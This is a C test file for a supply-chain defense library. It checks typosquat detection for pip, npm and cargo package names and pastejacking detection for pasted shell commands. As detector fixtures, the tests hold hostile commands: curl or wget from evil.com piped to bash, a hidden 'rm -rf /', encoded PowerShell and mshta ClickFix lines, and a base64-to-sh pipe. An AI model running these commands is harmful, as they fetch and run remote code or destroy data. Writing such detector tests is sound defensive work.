/*
 * tests/hlse_supply_tests.c
 *
 * Tests for supply chain defense: package typosquatting, pastejacking,
 * and network safety checks.
 *
 * Build: gcc -O2 -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
 *            -o tests/supply_tests tests/hlse_supply_tests.c \
 *            hlse_supply.c -I.
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <string.h>
#include "../hlse_supply.h"

static int total = 0, passed = 0, failed = 0;

#define TEST(name) do { total++; printf("  %-55s", name); } while(0)
#define PASS()     do { passed++; printf("PASS\n"); } while(0)
#define FAIL(m)    do { failed++; printf("FAIL — %s\n", m); } while(0)
#define CHECK(cond, msg) do { if (cond) { PASS(); } else { FAIL(msg); } } while(0)

/* ─── Package Typosquat ───────────────────────────────────────────────── */

static void test_pkg_exact_match(void) {
    TEST("Package: exact 'requests' → SAFE");
    PackageVerdict v = hlse_check_package("requests", "pip");
    CHECK(v.score == 0, "should be 0 for exact match");
}

static void test_pkg_typosquat_swap(void) {
    TEST("Package: 'reqeusts' (swap) → typosquat");
    PackageVerdict v = hlse_check_package("reqeusts", "pip");
    CHECK(v.score >= 40 && v.n_matches > 0,
          "should detect typosquat of requests");
}

static void test_pkg_typosquat_missing(void) {
    TEST("Package: 'requets' (missing char) → typosquat");
    PackageVerdict v = hlse_check_package("requets", "pip");
    CHECK(v.score >= 30 && v.n_matches > 0,
          "should detect typosquat of requests");
}

static void test_pkg_typosquat_npm(void) {
    TEST("Package: 'expresss' (npm, extra s) → typosquat");
    PackageVerdict v = hlse_check_package("expresss", "npm");
    CHECK(v.score >= 40 && v.n_matches > 0,
          "should detect typosquat of express");
}

static void test_pkg_typosquat_cargo(void) {
    TEST("Package: 'serdee' (cargo, extra e) → typosquat");
    PackageVerdict v = hlse_check_package("serdee", "cargo");
    CHECK(v.score >= 40 && v.n_matches > 0,
          "should detect typosquat of serde");
}

static void test_pkg_safe_unrelated(void) {
    TEST("Package: 'mycompanylib' → no match (safe)");
    PackageVerdict v = hlse_check_package("mycompanylib", NULL);
    CHECK(v.score == 0 || v.n_matches == 0,
          "unrelated name should not trigger");
}

static void test_pkg_underscore_hyphen(void) {
    TEST("Package: 'pyyaml' (exact, underscore norm) → SAFE");
    PackageVerdict v = hlse_check_package("pyyaml", "pip");
    CHECK(v.score == 0, "exact match after normalization");
}

static void test_pkg_all_ecosystems(void) {
    TEST("Package: 'tokioo' (all ecosystems) → find cargo");
    PackageVerdict v = hlse_check_package("tokioo", NULL);
    CHECK(v.score >= 30 && v.n_matches > 0,
          "should find tokio in cargo");
}

/* ─── Pastejacking ────────────────────────────────────────────────────── */

static void test_paste_safe(void) {
    TEST("Paste: 'ls -la' → SAFE");
    PasteVerdict v = hlse_check_paste("ls -la");
    CHECK(v.score < 30, "simple command is safe");
}

static void test_paste_curl_pipe(void) {
    TEST("Paste: 'curl http://x.com/s.sh | bash' → HIGH");
    PasteVerdict v = hlse_check_paste(
        "curl http://evil.com/setup.sh | bash");
    CHECK(v.score >= 40 && (v.signals & PASTE_CURL_PIPE_SH),
          "should detect curl|bash");
}

static void test_paste_hidden_newline(void) {
    TEST("Paste: hidden newline → detected");
    PasteVerdict v = hlse_check_paste(
        "echo safe\nrm -rf / --no-preserve-root");
    CHECK(v.score >= 20 && (v.signals & PASTE_HIDDEN_NEWLINE),
          "should detect hidden newline");
}

static void test_paste_rtl_override(void) {
    TEST("Paste: RTL override character → HIGH");
    PasteVerdict v = hlse_check_paste(
        "file \xe2\x80\xaegpj.exe");
    CHECK(v.score >= 40 && (v.signals & PASTE_UNICODE_CONTROL),
          "should detect RTL override");
}

static void test_paste_sudo_curl(void) {
    TEST("Paste: 'sudo curl ... | bash' → compound");
    PasteVerdict v = hlse_check_paste(
        "sudo curl http://evil.com/installer.sh | bash");
    CHECK(v.score >= 60, "sudo + curl|bash is critical");
}

static void test_paste_clickfix_powershell(void) {
    TEST("Paste: ClickFix PowerShell encoded → HIGH (P8)");
    PasteVerdict v = hlse_check_paste(
        "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA");
    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
          "should detect ClickFix PowerShell LOLBin");
}

static void test_paste_clickfix_mshta(void) {
    TEST("Paste: ClickFix 'mshta http://...' → HIGH (P8)");
    PasteVerdict v = hlse_check_paste("mshta http://evil.example/x.hta");
    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
          "should detect mshta remote execution");
}

static void test_paste_clickfix_case_insensitive(void) {
    TEST("Paste: mixed-case 'PowerShell ... IEX' → HIGH (P8)");
    PasteVerdict v = hlse_check_paste(
        "PowerShell -NoP -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://x')");
    CHECK(v.signals & PASTE_WINDOWS_LOLBIN,
          "case-insensitive match must fire");
}

static void test_paste_benign_powershell(void) {
    TEST("Paste: benign 'Get-ChildItem -Encoding utf8' → SAFE (no P8 FP)");
    PasteVerdict v = hlse_check_paste(
        "powershell Get-ChildItem -Path . -Recurse -Encoding utf8");
    CHECK(!(v.signals & PASTE_WINDOWS_LOLBIN),
          "legit admin one-liner must not trip P8");
}

static void test_paste_base64(void) {
    TEST("Paste: 'echo ... | base64 -d | sh' → encoded payload");
    PasteVerdict v = hlse_check_paste(
        "echo dG90YWxseSBzYWZl | base64 -d | sh");
    CHECK(v.score >= 25 && (v.signals & PASTE_ENCODED_PAYLOAD),
          "should detect encoded payload");
}

static void test_paste_history_evasion(void) {
    TEST("Paste: leading space → history evasion");
    PasteVerdict v = hlse_check_paste(" wget http://evil.com/malware");
    CHECK(v.signals & PASTE_HISTORY_EVASION,
          "should detect leading space");
}

static void test_paste_empty(void) {
    TEST("Paste: empty string → SAFE");
    PasteVerdict v = hlse_check_paste("");
    CHECK(v.score == 0, "empty is safe");
}

/* ─── Network Safety ──────────────────────────────────────────────────── */

static void test_network_runs(void) {
    TEST("Network: check completes without crash");
    NetworkVerdict v = hlse_check_network();
    CHECK(v.score >= 0 && v.score <= 100, "score in range");
}

/* ─── main ────────────────────────────────────────────────────────────── */

int main(void) {
    printf("HLSE Supply — Supply Chain Defense Tests\n");
    printf("══════════════════════════════════════════\n\n");

    printf("Package typosquatting:\n");
    test_pkg_exact_match();
    test_pkg_typosquat_swap();
    test_pkg_typosquat_missing();
    test_pkg_typosquat_npm();
    test_pkg_typosquat_cargo();
    test_pkg_safe_unrelated();
    test_pkg_underscore_hyphen();
    test_pkg_all_ecosystems();

    printf("\nPastejacking:\n");
    test_paste_safe();
    test_paste_curl_pipe();
    test_paste_hidden_newline();
    test_paste_rtl_override();
    test_paste_sudo_curl();
    test_paste_clickfix_powershell();
    test_paste_clickfix_mshta();
    test_paste_clickfix_case_insensitive();
    test_paste_benign_powershell();
    test_paste_base64();
    test_paste_history_evasion();
    test_paste_empty();

    printf("\nNetwork safety:\n");
    test_network_runs();

    printf("\n══════════════════════════════════════════\n");
    printf("Supply tests: %d/%d passed", passed, total);
    if (failed > 0) printf(", %d FAILED", failed);
    printf("\n══════════════════════════════════════════\n");

    return failed > 0 ? 1 : 0;
}
